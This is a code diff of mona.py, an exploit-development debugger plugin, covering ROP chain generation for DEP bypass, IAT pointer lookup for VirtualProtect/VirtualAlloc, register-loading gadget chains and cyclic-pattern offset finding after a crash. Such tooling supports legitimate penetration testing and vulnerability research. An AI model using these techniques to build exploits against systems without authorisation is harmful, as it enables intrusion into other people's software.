+		vplogtxt += vplogtxtc
+		vplogtxt += "  // use the 'rop_chain' variable after this call, it's just an unsigned int[]\n"
+		vplogtxt += "  CREATE_ROP_CHAIN(rop_chain, %s);\n" % argtxtpy
+		vplogtxt += "  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:\n"
+		vplogtxt += "  // unsigned int rop_chain[256];\n"
+		vplogtxt += "  // int rop_chain_length = create_rop_chain(rop_chain, %s);\n\n" % argtxtpy
+		# Python
+		vplogtxt += "*** [ Python ] ***\n\n"		
+		vplogtxt += "  def create_rop_chain(%s):\n" % argtxt
+		vplogtxt += "\n    # rop chain generated with mona.py - www.corelan.be\n"			
+		vplogtxt += "    rop_gadgets = [\n"
+		vplogtxt += thischaintxt
+		vplogtxt += "    ]\n"
+		vplogtxt += "    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)\n\n"
+		vplogtxt += vplogtxtpy
+		vplogtxt += "  rop_chain = create_rop_chain(%s)\n\n" % argtxtpy
+		# Javascript
+		vplogtxt += "\n\n*** [ JavaScript ] ***\n\n"
+		vplogtxt += "  //rop chain generated with mona.py - www.corelan.be\n"		
+		if not showrva:
+			vplogtxt += "  rop_gadgets = unescape(\n"
+			allptr = thischaintxt.split("\n")
+			tptrcnt = 0
+			for tptr in allptr:
+				comments = tptr.split(",")
+				comment = ""
+				if len(comments) > 1:
+					# add everything
+					ic = 1
+					while ic < len(comments):
+						comment += "," + comments[ic]
+						ic += 1
+				tptrcnt += 1
+				comment = comment.replace("  ","")
+				if tptrcnt < len(allptr):
+					vplogtxt += "    \"" + toJavaScript(tptr) + "\" + // " + comments[0].replace("  ","").replace(" ","") + " : " + comment + "\n"
+				else:
+					vplogtxt += "    \"" + toJavaScript(tptr) + "\"); // " + comments[0].replace("  ","").replace(" ","") + " : " + comment + "\n\n"
+		else:
+			vplogtxt += "  function get_rop_chain(%s) {\n" % argtxtjs
+			vplogtxt += "    var rop_gadgets = [\n"
+			vplogtxt += thischaintxt.replace("  #","  //").replace(".","")
+			vplogtxt += "      ];\n"
+			vplogtxt += "    return rop_gadgets;\n"
+			vplogtxt += "  }\n\n"
+			vplogtxt += "  function gadgets2uni(gadgets) {\n"
+			vplogtxt += "    var uni = \"\";\n"
+			vplogtxt += "    for(var i=0;i<gadgets.length;i++){\n"
+			vplogtxt += "      uni += d2u(gadgets[i]);\n"
+			vplogtxt += "    }\n"
+			vplogtxt += "    return uni;\n"
+			vplogtxt += "  }\n\n"
+			vplogtxt += "  function d2u(dword) {\n"
+			vplogtxt += "    var uni = String.fromCharCode(dword & 0xFFFF);\n"
+			vplogtxt += "    uni += String.fromCharCode(dword>>16);\n"
+			vplogtxt += "    return uni;\n"
+			vplogtxt += "  }\n\n"
+			vplogtxt += "%s" % vplogtxtjs
+			vplogtxt += "\n  var rop_chain = gadgets2uni(get_rop_chain(%s));\n\n" % argtxtjs
+		vplogtxt += '\n--------------------------------------------------------------------------------------------------\n\n'
+		
+		# MSF RopDB XML Format - spit out if only one module was selected
+		if len(modused) == 1:
+			modulename = ""
+			for modname in modused:
+				modulename = modname
+			objMod = MnModule(modulename)
+			modversion = objMod.moduleVersion
+			modbase = objMod.moduleBase
+			ropdb = '<?xml version="1.0" encoding="ISO-8859-1"?>\n'
+			ropdb += "<db>\n<rop>\n"
+			ropdb += "  <compatibility>\n"
+			ropdb += "    <target>%s</target>\n" % modversion
+			ropdb += "  </compatibility>\n\n"
+			ropdb += '  <gadgets base="0x%s">\n' % toHex(modbase)
+			ropdb += ropdbchain.replace('[' + modulename + ']','').replace('&','').replace('[IAT ' + modulename + ']','')
+			ropdb += '  </gadgets>\n'
+			ropdb += '</rop>\n</db>'
+			# write to file if needed
+			shortmodname = modulename.replace(".dll","")
+			ignoremodules = True
+			if ropdbchain.lower().find("virtualprotect") > -1:
+				ofile = MnLog(shortmodname+"_virtualprotect.xml")
+				thisofile = ofile.reset(showheader = False)
+				ofile.write(ropdb,thisofile)
+			if ropdbchain.lower().find("virtualalloc") > -1:
+				ofile = MnLog(shortmodname+"_virtualalloc.xml")
+				thisofile = ofile.reset(showheader = False)
+				ofile.write(ropdb,thisofile)
+			ignoremodules = False
+		
+		#go to the next one
+		
+	vpfile = MnLog("rop_chains.txt")
+	thisvplog = vpfile.reset()
+	vpfile.write(vplogtxt,thisvplog)
+	
+	dbg.log("[+] ROP chains written to file %s" % thisvplog)
+	objprogressfile.write("Done creating rop chains",progressfile)
+	return vplogtxt
+
+
+def getGadgetAddressInfo(gadgetptr):
+	gadgetmodname = MnPointer(gadgetptr).belongsTo()
+	infotxt = ""
+	tmod = MnModule(gadgetmodname)
+	if (tmod.isRebase):
+		infotxt += " ** REBASED"
+	if (tmod.isAslr):
+		infotxt += " ** ASLR"	
+	return infotxt
 
 
 def getRegImpact(instructionstr):
@@ -9121,44 +9622,119 @@ def getPickupGadget(targetreg,targetval,freetext,suggestions,interestinggadgets,
                 disablelist.append("eax")
                 pickupfound = True  
 
-    if not pickupfound:
-        pickupchain.append([0,"[-] Unable to find gadgets to pickup the desired API pointer into " + targetreg,0])
-        pickupchain.append([targetval,freetext,0])
-        
-    return pickupchain,disablelist
+	if not pickupfound:
+		pickupchain.append([0,"[-] Unable to find gadgets to pickup the desired API pointer into " + targetreg,0])
+		pickupchain.append([targetval,freetext,0])
+		
+	return pickupchain,disablelist
+	
+def getRopFuncPtr(apiname,modulecriteria,criteria,mode, objprogressfile, progressfile):
+	"""
+	Will get a pointer to pointer to the given API name in the IAT of the selected modules
+	
+	Arguments :
+	apiname : the name of the function
+	modulecriteria & criteria : module/pointer criteria
+	
+	Returns :
+	a pointer (integer value, 0 if no pointer was found)
+	text (with optional info)
+	"""
+	global silent
+	oldsilent = silent
+	silent = True
+	global ptr_to_get
+	ptr_to_get = -1	
+	rfuncsearch = apiname.lower()
     
-def getRopFuncPtr(apiname,modulecriteria,criteria,mode = "iat"):
-    """
-    Will get a pointer to pointer to the given API name in the IAT of the selected modules
-    
-    Arguments :
-    apiname : the name of the function
-    modulecriteria & criteria : module/pointer criteria
-    
-    Returns :
-    a pointer (integer value, 0 if no pointer was found)
-    text (with optional info)
-    """
-    global silent
-    oldsilent = silent
-    silent = True
-    global ptr_to_get
-    ptr_to_get = -1 
-    rfuncsearch = apiname.lower()
+	selectedmodules = False
+	if "modules" in modulecriteria:
+		if len(modulecriteria["modules"]) > 0:
+			selectedmodules = True
 
-    arrfuncsearch = [rfuncsearch]
-    if rfuncsearch == "virtualloc":
-        arrfuncsearch.append("virtuallocstub")
-    
-    ropfuncptr = 0
-    ropfuncoffsets = {}
-    ropfunctext = "ptr to &" + apiname + "()"
-    
-    if mode == "iat":
-        if rfuncsearch != "":
-            ropfuncs,ropfuncoffsets = findROPFUNC(modulecriteria,criteria, [rfuncsearch])
-        else:
-            ropfuncs,ropfuncoffsets = findROPFUNC(modulecriteria)
+	arrfuncsearch = [rfuncsearch]
+	if rfuncsearch == "virtualloc":
+		arrfuncsearch.append("virtuallocstub")
+	
+	ropfuncptr = 0
+	ropfuncoffsets = {}
+	ropfunctext = "ptr to &" + apiname + "()"
+	objprogressfile.write("  * Ropfunc - Looking for %s (IAT) - modulecriteria: %s" % (ropfunctext, modulecriteria), progressfile)
+	if mode == "iat":
+		if rfuncsearch != "":
+			ropfuncs,ropfuncoffsets = findROPFUNC(modulecriteria,criteria, [rfuncsearch])
+		else:
+			ropfuncs,ropfuncoffsets = findROPFUNC(modulecriteria)
+		silent = oldsilent
+		#first look for good one
+		objprogressfile.write("  * Ropfunc - Found %d pointers" % len(ropfuncs), progressfile)
+		for ropfunctypes in ropfuncs:
+			#dbg.log("Ropfunc - %s %s" % (ropfunctypes, rfuncsearch))
+			if ropfunctypes.lower().find(rfuncsearch) > -1 and ropfunctypes.lower().find("rebased") == -1:
+				ropfuncptr = ropfuncs[ropfunctypes][0]
+				break
+                
+		if ropfuncptr == 0:
+			for ropfunctypes in ropfuncs:
+				if ropfunctypes.lower().find(rfuncsearch) > -1:
+					ropfuncptr = ropfuncs[ropfunctypes][0]
+					break
+		#dbg.log("Ropfunc - Selected pointer: 0x%08x" % ropfuncptr)
+        
+		#haven't found pointer, and you were looking at specific modules only? remove module restriction, but still exclude ASLR/rebase
+		if (ropfuncptr == 0) and selectedmodules:
+			objprogressfile.write("  * Ropfunc - No results yet, expanding search to all non ASLR/rebase modules", progressfile)
+			oldsilent = silent
+			silent = True
+			limitedmodulecriteria = {}
+			limitedmodulecriteria["aslr"] = False
+			limitedmodulecriteria["rebase"] = False
+			limitedmodulecriteria["os"] = False
+			ropfuncs,ropfuncoffsets = findROPFUNC(limitedmodulecriteria,criteria)
+			silent = oldsilent
+			for ropfunctypes in ropfuncs:
+				#dbg.log("Ropfunc - %s %s" % (ropfunctypes, rfuncsearch))
+				if ropfunctypes.lower().find(rfuncsearch) > -1 and ropfunctypes.lower().find("rebased") == -1:
+					ropfuncptr = ropfuncs[ropfunctypes][0]
+					break
+                
+		#still haven't found ? clear out modulecriteria, include ASLR/rebase modules (but not OS modules)
+		if (ropfuncptr == 0) and not selectedmodules:
+			objprogressfile.write("  * Ropfunc - Still no results, now going to search in all application modules", progressfile)
+			oldsilent = silent
+			silent = True
+			limitedmodulecriteria = {}
+			# search in anything except known OS modules - bad idea anyway
+			limitedmodulecriteria["os"] = False
+			ropfuncs2,ropfuncoffsets2 = findROPFUNC(limitedmodulecriteria,criteria)
+			silent = oldsilent
+			for ropfunctypes in ropfuncs2:
+				if ropfunctypes.lower().find(rfuncsearch) > -1 and ropfunctypes.lower().find("rebased") == -1:
+					ropfuncptr = ropfuncs2[ropfunctypes][0]
+					ropfunctext += " (skipped module criteria, check if pointer is reliable !)"
+					break	
+		
+		if ropfuncptr == 0:
+			ropfunctext = "[-] Unable to find ptr to &" + apiname+"()"
+		else:
+			ropfptrmodname = MnPointer(ropfuncptr).belongsTo()
+			tmod = MnModule(ropfptrmodname)					
+			ropfptrmodinfo = getGadgetAddressInfo(ropfuncptr)
+			ropfunctext += " [IAT " + ropfptrmodname  + "]" + ropfptrmodinfo
+	else:
+		# read EAT
+		modulestosearch = getModulesToQuery(modulecriteria)
+		for mod in modulestosearch:
+			tmod = MnModule(mod)
+			funcs = tmod.getEAT()
+			for func in funcs:
+				funcname = funcs[func].lower()
+				if funcname.find(rfuncsearch) > -1:
+					ropfuncptr = func
+					break
+		if ropfuncptr == 0:
+			ropfunctext = "[-] Unable to find required API pointer"
+	return ropfuncptr,ropfunctext
 
         silent = oldsilent
         #first look for good one
@@ -9601,78 +10177,78 @@ def clearReg(reg,suggestions,interestinggadgets):
     return clearchain
     
 def getGadgetValueToReg(reg,value,suggestions,interestinggadgets):
-    negfound = False
-    blocktxt = ""
-    blocktxt2 = ""  
-    tonegate = 4294967296 - value
-    nregs = ["eax","ebx","ecx","edx","edi"]
-    junksize = 0
-    junk2size = 0
-    negateline = "      0x" + toHex(tonegate)+",  # value to negate, target value : 0x" + toHex(value) + ", target reg : " + reg +"\n"
-    if "neg " + reg in suggestions:
-        negfound = True
-        negptr = getShortestGadget(suggestions["neg " + reg])
-        if "pop "+reg in suggestions:
-            pptr = getShortestGadget(suggestions["pop " + reg])
-            blocktxt2 += "      0x" + toHex(pptr)+",  "+interestinggadgets[pptr].strip()+" ("+MnPointer(pptr).belongsTo()+")\n"                 
-            blocktxt2 += negateline
-            junk2size = getJunk(interestinggadgets[pptr])-4
-        else:
-            blocktxt2 += "      0x????????,#  find a way to pop the next value into "+thisreg+"\n"                  
-            blocktxt2 += negateline         
-        blocktxt2 += "      0x" + toHex(negptr)+",  "+interestinggadgets[negptr].strip()+" ("+MnPointer(negptr).belongsTo()+")\n"
-        junksize = getJunk(interestinggadgets[negptr])-4
-        
-    if not negfound:
-        nregs.remove(reg)
-        for thisreg in nregs:
-            if "neg "+ thisreg in suggestions and not negfound:
-                blocktxt2 = ""
-                junk2size = 0
-                negfound = True
-                #get pop first
-                if "pop "+thisreg in suggestions:
-                    pptr = getShortestGadget(suggestions["pop " + thisreg])
-                    blocktxt2 += "      0x" + toHex(pptr)+",  "+interestinggadgets[pptr].strip()+" ("+MnPointer(pptr).belongsTo()+")\n"                 
-                    blocktxt2 += negateline
-                    junk2size = getJunk(interestinggadgets[pptr])-4
-                else:
-                    blocktxt2 += "      0x????????,#  find a way to pop the next value into "+thisreg+"\n"                  
-                    blocktxt2 += negateline             
-                negptr = getShortestGadget(suggestions["neg " + thisreg])
-                blocktxt2 += "      0x" + toHex(negptr)+",  "+interestinggadgets[negptr].strip()+" ("+MnPointer(negptr).belongsTo()+")\n"
-                junk2size = junk2size + getJunk(interestinggadgets[negptr])-4               
-                #now move it to reg
-                if "move " + thisreg + " -> " + reg in suggestions:
-                    bptr = getShortestGadget(suggestions["move " + thisreg + " -> " + reg])
-                    if interestinggadgets[bptr].strip().startswith("# ADD"):
-                        if not "clear " + reg in suggestions:
-                            # other way to clear reg, using pop + inc ?
-                            if not "inc " + reg in suggestions or not "pop " + reg in suggestions:
-                                blocktxt2 += "      0x????????,  # find pointer to clear " + reg+"\n"
-                            else:
-                                #pop FFFFFFFF into reg, then do inc reg => 0
-                                pptr = getShortestGadget(suggestions["pop " + reg])
-                                blocktxt2 += "      0x" + toHex(pptr)+",  "+interestinggadgets[pptr].strip()+" ("+MnPointer(pptr).belongsTo()+")\n"
-                                blocktxt2 += "      0xffffffff,  # pop value into " + reg + "\n"
-                                blocktxt2 += createJunk(getJunk(interestinggadgets[pptr])-4)
-                                iptr = getShortestGadget(suggestions["inc " + reg])
-                                blocktxt2 += "      0x" + toHex(iptr)+",  "+interestinggadgets[iptr].strip()+" ("+MnPointer(pptr).belongsTo()+")\n"                             
-                                junksize += getJunk(interestinggadgets[iptr])
-                        else:
-                            clearptr = getShortestGadget(suggestions["empty " + reg])
-                            blocktxt2 += "      0x" + toHex(clearptr)+",  "+interestinggadgets[clearptr].strip()+" ("+MnPointer(clearptr).belongsTo()+")\n" 
-                            junk2size = junk2size + getJunk(interestinggadgets[clearptr])-4
-                    blocktxt2 += "      0x" + toHex(bptr)+",  "+interestinggadgets[bptr].strip()+" ("+MnPointer(bptr).belongsTo()+")\n"
-                    junk2size = junk2size + getJunk(interestinggadgets[bptr])-4
-                else:
-                    negfound = False
-    if negfound: 
-        blocktxt += blocktxt2
-    else:
-        blocktxt = ""
-    junksize = junksize + junk2size
-    return blocktxt,junksize
+	negfound = False
+	blocktxt = ""
+	blocktxt2 = ""	
+	tonegate = 4294967296 - value
+	nregs = ["eax","ebx","ecx","edx","edi"]
+	junksize = 0
+	junk2size = 0
+	negateline = "      0x" + toHex(tonegate)+",  # value to negate, target value : 0x" + toHex(value) + ", target reg : " + reg +"\n"
+	if "neg " + reg in suggestions:
+		negfound = True
+		negptr = getShortestGadget(suggestions["neg " + reg])
+		if "pop "+reg in suggestions:
+			pptr = getShortestGadget(suggestions["pop " + reg])
+			blocktxt2 += "      0x" + toHex(pptr)+",  "+interestinggadgets[pptr].strip()+" ("+MnPointer(pptr).belongsTo()+")\n"					
+			blocktxt2 += negateline
+			junk2size = getJunk(interestinggadgets[pptr])-4
+		else:
+			blocktxt2 += "      0x????????,#  find a way to pop the next value into " + reg + "\n"					
+			blocktxt2 += negateline			
+		blocktxt2 += "      0x" + toHex(negptr)+",  "+interestinggadgets[negptr].strip()+" ("+MnPointer(negptr).belongsTo()+")\n"
+		junksize = getJunk(interestinggadgets[negptr])-4
+		
+	if not negfound:
+		nregs.remove(reg)
+		for thisreg in nregs:
+			if "neg "+ thisreg in suggestions and not negfound:
+				blocktxt2 = ""
+				junk2size = 0
+				negfound = True
+				#get pop first
+				if "pop "+thisreg in suggestions:
+					pptr = getShortestGadget(suggestions["pop " + thisreg])
+					blocktxt2 += "      0x" + toHex(pptr)+",  "+interestinggadgets[pptr].strip()+" ("+MnPointer(pptr).belongsTo()+")\n"					
+					blocktxt2 += negateline
+					junk2size = getJunk(interestinggadgets[pptr])-4
+				else:
+					blocktxt2 += "      0x????????,#  find a way to pop the next value into "+thisreg+"\n"					
+					blocktxt2 += negateline				
+				negptr = getShortestGadget(suggestions["neg " + thisreg])
+				blocktxt2 += "      0x" + toHex(negptr)+",  "+interestinggadgets[negptr].strip()+" ("+MnPointer(negptr).belongsTo()+")\n"
+				junk2size = junk2size + getJunk(interestinggadgets[negptr])-4				
+				#now move it to reg
+				if "move " + thisreg + " -> " + reg in suggestions:
+					bptr = getShortestGadget(suggestions["move " + thisreg + " -> " + reg])
+					if interestinggadgets[bptr].strip().startswith("# ADD"):
+						if not "clear " + reg in suggestions:
+							# other way to clear reg, using pop + inc ?
+							if not "inc " + reg in suggestions or not "pop " + reg in suggestions:
+								blocktxt2 += "      0x????????,  # find pointer to clear " + reg+"\n"
+							else:
+								#pop FFFFFFFF into reg, then do inc reg => 0
+								pptr = getShortestGadget(suggestions["pop " + reg])
+								blocktxt2 += "      0x" + toHex(pptr)+",  "+interestinggadgets[pptr].strip()+" ("+MnPointer(pptr).belongsTo()+")\n"
+								blocktxt2 += "      0xffffffff,  # pop value into " + reg + "\n"
+								blocktxt2 += createJunk(getJunk(interestinggadgets[pptr])-4)
+								iptr = getShortestGadget(suggestions["inc " + reg])
+								blocktxt2 += "      0x" + toHex(iptr)+",  "+interestinggadgets[iptr].strip()+" ("+MnPointer(pptr).belongsTo()+")\n"								
+								junksize += getJunk(interestinggadgets[iptr])
+						else:
+							clearptr = getShortestGadget(suggestions["empty " + reg])
+							blocktxt2 += "      0x" + toHex(clearptr)+",  "+interestinggadgets[clearptr].strip()+" ("+MnPointer(clearptr).belongsTo()+")\n"	
+							junk2size = junk2size + getJunk(interestinggadgets[clearptr])-4
+					blocktxt2 += "      0x" + toHex(bptr)+",  "+interestinggadgets[bptr].strip()+" ("+MnPointer(bptr).belongsTo()+")\n"
+					junk2size = junk2size + getJunk(interestinggadgets[bptr])-4
+				else:
+					negfound = False
+	if negfound: 
+		blocktxt += blocktxt2
+	else:
+		blocktxt = ""
+	junksize = junksize + junk2size
+	return blocktxt,junksize
 
 def getOffset(instructions):
     offset = 0
@@ -10447,35 +11023,35 @@ def checkSEHOverwrite(address, nseh, seh):
 
 
 def goFindMSP(distance = 0,args = {}):
-    """
-    Finds all references to cyclic pattern in memory
-    
-    Arguments:
-    None
-    
-    Return:
-    Dictonary with results of the search operation
-    """
-    results = {}
-    regs = dbg.getRegs()
-    criteria = {}
-    criteria["accesslevel"] = "*"
-    
-    tofile = ""
-    
-    global silent
-    oldsilent = silent
-    silent=True 
-    
-    fullpattern = createPattern(50000,args)
-    factor = 1
-    
-    #are we attached to an application ?
-    if dbg.getDebuggedPid() == 0:
-        dbg.log("*** Attach to an application, and trigger a crash with a cyclic pattern ! ***",highlight=1)
-        return  {}
-    
-    #1. find beging of cyclic pattern in memory ?
+	"""
+	Finds all references to cyclic pattern in memory
+	
+	Arguments:
+	None
+	
+	Return:
+	Dictonary with results of the search operation
+	"""
+	results = {}
+	regs = dbg.getRegs()
+	criteria = {}
+	criteria["accesslevel"] = "*"
+	
+	tofile = ""
+	
+	global silent
+	oldsilent = silent
+	silent=True	
+	
+	fullpattern = createPattern(50000,args)
+	factor = 1
+	
+	#are we attached to an application ?
+	if dbg.getDebuggedPid() == 0:
+		dbg.log("*** Attach to an application, and trigger a crash with a cyclic pattern ! ***",highlight=1)
+		return	{}
+	
+	#1. find beginning of cyclic pattern in memory ?
 
     patbegin = createPattern(6,args)
     
@@ -10709,397 +11285,403 @@ def goFindMSP(distance = 0,args = {}):
             dbg.log("    Walking stack from 0x%s to 0x%s (0x%s bytes)" % (toHex(stackcounter),toHex(thisstacktop-4),toHex(thisstacktop-4-stackcounter)))
         tofile += "    Walking stack from 0x%s to 0x%s (0x%s bytes)\n" % (toHex(stackcounter),toHex(thisstacktop-4),toHex(thisstacktop-4-stackcounter))
 
-        # stack contains part of a cyclic pattern ?
-        while stackcounter < thisstacktop-4:
-            espoffset = stackcounter - curresp
-            stepsize = 4
-            dbg.updateLog() 
-            if espoffset > -1:
-                sign="+"            
-            else:
-                sign="-"    
-                
-            cont = dbg.readMemory(stackcounter,4)
-            
-            if len(cont) == 4:
-                contat = cont
-                if contat <> "":
-        
-                    for pattype in pattypes:
-                        dbg.updateLog()
-                        regpattern = fullpattern
-                        
-                        hexpat = contat
-                    
-                        if pattype == "upper":
-                            regpattern = regpattern.upper()
-                        if pattype == "lower":
-                            regpattern = regpattern.lower()
-                        if pattype == "unicode":
-                            hexpat1 = dbg.readMemory(stackcounter,4)
-                            hexpat2 = dbg.readMemory(stackcounter+4,4)
-                            hexpat1 = hexpat1.replace('\x00','')
-                            hexpat2 = hexpat2.replace('\x00','')
-                            if hexpat1 == "" or hexpat2 == "":
-                                #no unicode
-                                hexpat = ""
-                                break
-                            else:
-                                hexpat = hexpat1 + hexpat2
-                        
-                        if len(hexpat) == 4:
-                            
-                            offset = regpattern.find(hexpat)
-                            
-                            currptr = stackcounter
-                            
-                            if offset > -1:             
-                                thissize = getPatternLength(currptr,pattype)
-                                offsetvalue = int(str(espoffset).replace("-",""))                               
-                                if thissize > 0:
-                                    stepsize = thissize
-                                    if thissize/4*4 != thissize:
-                                        stepsize = (thissize/4*4) + 4
-                                    # align stack again
-                                    if not silent:
-                                        espoff = 0
-                                        espsign = "+"
-                                        if ((stackcounter + thissize) >= curresp):
-                                            espoff = (stackcounter + thissize) - curresp
-                                        else:
-                                            espoff = curresp - (stackcounter + thissize)
-                                            espsign = "-"                                           
-                                        dbg.log("    0x%s : Contains %s cyclic pattern at ESP%s0x%s (%s%s) : offset %d, length %d (-> 0x%s : ESP%s0x%s)" % (toHex(stackcounter),pattype,sign,rmLeading(toHex(offsetvalue),"0"),sign,offsetvalue,offset,thissize,toHex(stackcounter+thissize-1),espsign,rmLeading(toHex(espoff),"0")))
-                                    tofile += "    0x%s : Contains %s cyclic pattern at ESP%s0x%s (%s%s) : offset %d, length %d (-> 0x%s : ESP%s0x%s)\n" % (toHex(stackcounter),pattype,sign,rmLeading(toHex(offsetvalue),"0"),sign,offsetvalue,offset,thissize,toHex(stackcounter+thissize-1),espsign,rmLeading(toHex(espoff),"0"))
-                                    if not currptr in stackcontains:
-                                        stackcontains[currptr] = ([offsetvalue,sign,offset,thissize,pattype])
-                                else:
-                                    #if we are close to ESP, change stepsize to 1
-                                    if offsetvalue <= 256:
-                                        stepsize = 1
-            stackcounter += stepsize
-            
+		# stack contains part of a cyclic pattern ?
+		while stackcounter < thisstacktop-4:
+			espoffset = stackcounter - curresp
+			stepsize = 4
+			dbg.updateLog()	
+			if espoffset > -1:
+				sign="+"			
+			else:
+				sign="-"	
+				
+			cont = dbg.readMemory(stackcounter,4)
+			
+			if len(cont) == 4:
+				contat = cont
+				if contat != "":
+		
+					for pattype in pattypes:
+						dbg.updateLog()
+						regpattern = fullpattern
+						
+						hexpat = contat
+					
+						if pattype == "upper":
+							regpattern = regpattern.upper()
+						if pattype == "lower":
+							regpattern = regpattern.lower()
+						if pattype == "unicode":
+							hexpat1 = dbg.readMemory(stackcounter,4)
+							hexpat2 = dbg.readMemory(stackcounter+4,4)
+							hexpat1 = hexpat1.replace('\x00','')
+							hexpat2 = hexpat2.replace('\x00','')
+							if hexpat1 == "" or hexpat2 == "":
+								#no unicode
+								hexpat = ""
+								break
+							else:
+								hexpat = hexpat1 + hexpat2
+						
+						if len(hexpat) == 4:
+							
+							offset = regpattern.find(hexpat)
+							
+							currptr = stackcounter
+							
+							if offset > -1:				
+								thissize = getPatternLength(currptr,pattype)
+								offsetvalue = int(str(espoffset).replace("-",""))								
+								if thissize > 0:
+									stepsize = thissize
+									if thissize/4*4 != thissize:
+										stepsize = (thissize/4*4) + 4
+									# align stack again
+									if not silent:
+										espoff = 0
+										espsign = "+"
+										if ((stackcounter + thissize) >= curresp):
+											espoff = (stackcounter + thissize) - curresp
+										else:
+											espoff = curresp - (stackcounter + thissize)
+											espsign = "-"											
+										dbg.log("    0x%s : Contains %s cyclic pattern at ESP%s0x%s (%s%s) : offset %d, length %d (-> 0x%s : ESP%s0x%s)" % (toHex(stackcounter),pattype,sign,rmLeading(toHex(offsetvalue),"0"),sign,offsetvalue,offset,thissize,toHex(stackcounter+thissize-1),espsign,rmLeading(toHex(espoff),"0")))
+									tofile += "    0x%s : Contains %s cyclic pattern at ESP%s0x%s (%s%s) : offset %d, length %d (-> 0x%s : ESP%s0x%s)\n" % (toHex(stackcounter),pattype,sign,rmLeading(toHex(offsetvalue),"0"),sign,offsetvalue,offset,thissize,toHex(stackcounter+thissize-1),espsign,rmLeading(toHex(espoff),"0"))
+									if not currptr in stackcontains:
+										stackcontains[currptr] = ([offsetvalue,sign,offset,thissize,pattype])
+								else:
+									#if we are close to ESP, change stepsize to 1
+									if offsetvalue <= 256:
+										stepsize = 1
+			stackcounter += stepsize
+			
 
-            
-        # stack has pointer into cyclic pattern ?
-        if not silent:
-            if distance == 0:
-                extratxt = "(entire stack)"
-            else:
-                extratxt = "(+- "+str(distance)+" bytes)"
-            dbg.log("[+] Examining stack %s - looking for pointers to cyclic pattern" % extratxt)   
-        tofile += "[+] Examining stack %s - looking for pointers to cyclic pattern\n" % extratxt
-        # get stack this address belongs to
-        stacks = getStacks()
-        thisstackbase = 0
-        thisstacktop = 0
-        if distance < 1:
-            for tstack in stacks:
-                if (stacks[tstack][0] < curresp) and (curresp < stacks[tstack][1]):
-                    thisstackbase = stacks[tstack][0]
-                    thisstacktop = stacks[tstack][1]
-        else:
-            thisstackbase = curresp - distance
-            thisstacktop = curresp + distance + 8
-        stackcounter = thisstackbase
-        sign=""     
-        
-        if not silent:
-            dbg.log("    Walking stack from 0x%s to 0x%s (0x%s bytes)" % (toHex(stackcounter),toHex(thisstacktop-4),toHex(thisstacktop-4-stackcounter)))
-        tofile += "    Walking stack from 0x%s to 0x%s (0x%s bytes)\n" % (toHex(stackcounter),toHex(thisstacktop-4),toHex(thisstacktop-4-stackcounter))
-        while stackcounter < thisstacktop-4:
-            espoffset = stackcounter - curresp
-            
-            dbg.updateLog() 
-            if espoffset > -1:
-                sign="+"            
-            else:
-                sign="-"    
-                
-            cont = dbg.readMemory(stackcounter,4)
-            
-            if len(cont) == 4:
-                cval=""             
-                for sbytes in cont:
-                    tval = hex(ord(sbytes)).replace("0x","")
-                    if len(tval) < 2:
-                        tval="0"+tval
-                    cval = tval+cval
-                try:                
-                    contat = dbg.readMemory(hexStrToInt(cval),4)
-                except:
-                    contat = "" 
-                    
-                if contat <> "":
-                    for pattype in pattypes:
-                        dbg.updateLog()
-                        regpattern = fullpattern
-                        
-                        hexpat = contat
-                    
-                        if pattype == "upper":
-                            regpattern = regpattern.upper()
-                        if pattype == "lower":
-                            regpattern = regpattern.lower()
-                        if pattype == "unicode":
-                            hexpat1 = dbg.readMemory(stackcounter,4)
-                            hexpat2 = dbg.readMemory(stackcounter+4,4)
-                            hexpat1 = hexpat1.replace('\x00','')
-                            hexpat2 = hexpat2.replace('\x00','')
-                            if hexpat1 == "" or hexpat2 == "":
-                                #no unicode
-                                hexpat = ""
-                                break
-                            else:
-                                hexpat = hexpat1 + hexpat2
-                        
-                        if len(hexpat) == 4:
-                            offset = regpattern.find(hexpat)
-                            currptr = hexStrToInt(cval)
-                            
-                            if offset > -1:             
-                                thissize = getPatternLength(currptr,pattype)
-                                if thissize > 0:
-                                    offsetvalue = int(str(espoffset).replace("-",""))
-                                    if not silent:
-                                        dbg.log("    0x%s : Pointer into %s cyclic pattern at ESP%s0x%s (%s%s) : 0x%s : offset %d, length %d" % (toHex(stackcounter),pattype,sign,rmLeading(toHex(offsetvalue),"0"),sign,offsetvalue,toHex(currptr),offset,thissize))
-                                    tofile += "    0x%s : Pointer into %s cyclic pattern at ESP%s0x%s (%s%s) : 0x%s : offset %d, length %d\n" % (toHex(stackcounter),pattype,sign,rmLeading(toHex(offsetvalue),"0"),sign,offsetvalue,toHex(currptr),offset,thissize)
-                                    if not currptr in stack:
-                                        stack[currptr] = ([offsetvalue,sign,offset,thissize,pattype])                   
-                            
-            stackcounter += 4
-    else:
-        dbg.log("** Are you connected to an application ?",highlight=1)
-        
-    if not "stack" in results:
-        results["stack"] = stack
-    if not "stackcontains" in results:
-        results["stackcontains"] = stack
-        
-    if tofile != "":
-        objfindmspfile = MnLog("findmsp.txt")
-        findmspfile = objfindmspfile.reset()
-        objfindmspfile.write(tofile,findmspfile)
-    return results
-    
-    
+			
+		# stack has pointer into cyclic pattern ?
+		if not silent:
+			if distance == 0:
+				extratxt = "(entire stack)"
+			else:
+				extratxt = "(+- "+str(distance)+" bytes)"
+			dbg.log("[+] Examining stack %s - looking for pointers to cyclic pattern" % extratxt)	
+		tofile += "[+] Examining stack %s - looking for pointers to cyclic pattern\n" % extratxt
+		# get stack this address belongs to
+		stacks = getStacks()
+		thisstackbase = 0
+		thisstacktop = 0
+		if distance < 1:
+			for tstack in stacks:
+				if (stacks[tstack][0] < curresp) and (curresp < stacks[tstack][1]):
+					thisstackbase = stacks[tstack][0]
+					thisstacktop = stacks[tstack][1]
+		else:
+			thisstackbase = curresp - distance
+			thisstacktop = curresp + distance + 8
+		stackcounter = thisstackbase
+		sign=""		
+		
+		if not silent:
+			dbg.log("    Walking stack from 0x%s to 0x%s (0x%s bytes)" % (toHex(stackcounter),toHex(thisstacktop-4),toHex(thisstacktop-4-stackcounter)))
+		tofile += "    Walking stack from 0x%s to 0x%s (0x%s bytes)\n" % (toHex(stackcounter),toHex(thisstacktop-4),toHex(thisstacktop-4-stackcounter))
+		while stackcounter < thisstacktop-4:
+			espoffset = stackcounter - curresp
+			
+			dbg.updateLog()	
+			if espoffset > -1:
+				sign="+"			
+			else:
+				sign="-"	
+				
+			cont = dbg.readMemory(stackcounter,4)
+			
